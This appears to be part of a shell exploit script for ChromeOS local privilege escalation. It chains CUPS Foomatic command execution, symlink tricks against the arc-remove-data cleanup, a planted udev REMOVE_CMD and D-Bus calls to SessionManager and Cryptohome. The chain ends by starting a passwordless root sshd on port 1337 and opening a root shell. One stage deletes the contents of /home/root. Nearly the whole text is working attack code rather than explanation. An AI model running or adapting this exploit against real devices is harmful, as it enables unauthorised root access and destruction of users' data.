trigger_cups() {
    # trigger FoomaticRIPCommandLine by adding a printer, 'printing' a pdf, and removing the printer
    # the fifo is just for timing
    add_printer
    mkfifo -m 777 /tmp/f
    touch /tmp/l
    chmod 777 /tmp/l
    triggerpdf=$(mktemp)
    drop_pdf ${triggerpdf}
    lp -d $(printer_guid) ${triggerpdf} >/dev/null
    rm ${triggerpdf}
    cat /tmp/f > /dev/null
    rm /tmp/f /tmp/l /tmp/p
    remove_printer
}

viacups() {
    # generic handler for each of the /tmp/p stagers
    $@
    trigger_cups
}

stage_backup() {
    # create a script to be run by cups to set up the /home/root/[hash]/android-data{,-old} directories
    # to backup the user's /home/root (hash -> .hash)
    # the last thing arc-remove-data does is unlink android-data, so if we base our android-data-old off this symlink we can stop arc-remove-stale-directories from working and wiping out our backup.
    salty_username=$1
    target=$2
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir /home/root/.${target}
mkdir /home/root/.${target}/backup

ln -s /home/root/${target} ${base}/android-data
ln -s android-data/../.${target}/backup/ ${base}/android-data-old
EOF
}

restore_backup() {
    # restore the above post-exploit, so we have a root shell
    runasroot "mv /home/root/.${CROS_USER_ID_HASH}/backup/**/android-data/* /home/root/${CROS_USER_ID_HASH} && rm -rf /home/root/.${CROS_USER_ID_HASH}"
}

brute_empty_hash() {
    # brute force a hash that, when lexographically sorted by rm -rf * will be deleted *after* the guest directory
    target_name=$(xxd -ps -l 8 /dev/urandom)
    salty_username=$(get_salty_username ${target_name})
    while [ "$(/bin/echo -e "${salty_username}\n${salty_guest}" | sort | tail -n1)" = "${salty_guest}" ]; do
        target_name=$(xxd -ps -l 8 /dev/urandom)
        salty_username=$(get_salty_username ${target_name})
    done
    echo "${target_name}"
}

stage_empty() {
    # stage the hash directory for the rm -rf android-data-old/ * to delete /home/root/ *
    salty_username=$1
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir ${base}/android-data
date > ${base}/android-data/deleteme
ln -s /home/root/ ${base}/android-data-old
EOF
}

wait_for_ard() {
    while ps aux | grep -q [r]emove-data; do
        sleep 0.5
    done
}

trigger_ard() {
    # arc-remove-data can be run by chronos, however in master it's in a mount namespace
    # so we can only move stuff around /home/root/
    username=${1}
    dbus-send --print-reply --system --dest=com.ubuntu.Upstart /com/ubuntu/Upstart/jobs/arc_2dremove_2ddata com.ubuntu.Upstart0_6.Job.Start array:string:"CHROMEOS_USER=${username}" boolean:false >/dev/null
    wait_for_ard
}

stage_overwrite() {
    # create a script to be run by cups to set up the /home/root/[hash]/android-data{,-old} directories
    # for the targeted copy
    # android-data/cache/EXPLOIT will be written to /run/udev/data/+pci:0000:00:00.0, so the command is in that format (E:REMOVE_CMD)
    salty_username=$1
    mount=/media/fuse/exploit
    base="/home/root/${salty_username}"
    cat > /tmp/p <<-EOF
mkdir ${base}
mkdir ${base}/android-data
mkdir ${base}/android-data/cache
echo "E:REMOVE_CMD=/bin/sh -c '/usr/sbin/sshd -f /tmp/sshd_config'" > ${base}/android-data/cache/EXPLOIT
mv ${base}/android-data-old ${base}/android-data-old.exploit.$(date +%s)
ln -s ${mount}/android-data-old ${base}/android-data-old
EOF
    stage_sshd
}

stage_sshd() {
    # set up a fake ssh server using the system sshd and enabling passwordless login for root with the provided key
    if [ ! -e /tmp/ssh_host_rsa_key ]; then
        ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
        mkdir /tmp/root/
        cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
    fi
    cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
    rm -f /home/chronos/user/.ssh/known_hosts
}

trigger_copy() {
    # trigger the android-data/cache move
    # StartSession won't work without .pki/nssdb, so make it
    mkdir -p /home/user/${salty_guest}/.pki/nssdb
    (
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StartSession string:'$guest' string:
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StopArcInstance
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StartArcMiniContainer array:byte:0x10,0x01
    dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.UpgradeArcContainer array:byte:0x0a,$(dbus_pack_user '$guest')
    ) > /dev/null 2>&1

}


stage_rescan() {
    # create the script for cups to remove and readd the pci device. This _may_ have unknown side effects
    # but none were seen during testing
    cat > /tmp/p <<-EOF
echo 1 > /sys/devices/pci0000\:00/0000\:00\:00.0/remove
echo 1 > /sys/devices/pci0000\:00/pci_bus/0000\:00/rescan
EOF
}

MountEx() {
    # do an ephemeral mount with new keys for the specified user.
    # first protobuf (AccountIdentifier): account_id = packed username

    # second protobuf (AuthorizationRequest):
    # key {
    #   data {
    #     type: KEY_TYPE_PASSWORD
    #     privileges {
    #       mount: true
    #       add: true
    #       remove: true
    #       update: true
    #       authorized_update: false
    #     }
    #   }
    #   secret: "test"
    # }

    # third protobuf (MountRequest):
    # require_ephemeral: true
    # create {
    #   keys {
    #     data {
    #       type: KEY_TYPE_PASSWORD
    #       label: "test"
    #     }
    #     secret: "test"
    #   }
    # }
    # to_migrate_from_ecryptfs: true
    # hidden_mount: true

    packeduser=$1
    dbus-send --system --print-reply --dest=org.chromium.Cryptohome /org/chromium/Cryptohome org.chromium.CryptohomeInterface.MountEx     array:byte:0x12,${packeduser}     array:byte:0xa,0x16,0xa,0xe,0x8,0x0,0x1a,0xa,0x8,0x1,0x10,0x1,0x18,0x1,0x20,0x1,0x28,0x0,0x12,0x4,0x74,0x65,0x73,0x74     array:byte:0x8,0x1,0x12,0x12,0xa,0x10,0xa,0x8,0x8,0x0,0x12,0x4,0x74,0x65,0x73,0x74,0x12,0x4,0x74,0x65,0x73,0x74,0x20,0x1,0x30,0x1 >/dev/null
}

create_guest_dirs() {
    # if you mount guest cryptohome, then try (and fail) to mount another user, both end up unmounted
    # which means /home/user/[hash] and /home/root/[hash] are created
    # we delete the root one later but the user one remains

    tgtuser=$(xxd -ps -l 8 /dev/urandom)@exploit.com
    saltytgtuser=$(get_salty_username ${tgtuser})

    MountEx $(dbus_pack_user '$guest')

    touch /home/chronos/u-${saltytgtuser}
    MountEx $(dbus_pack_user "${tgtuser}")
    rm /home/chronos/u-${saltytgtuser}
}

runasroot() {
    ssh -p 1337 -i /tmp/ssh_host_rsa_key -o StrictHostKeyChecking=no root@127.0.0.1 "$@"
}

interactive() {
    runasroot
}

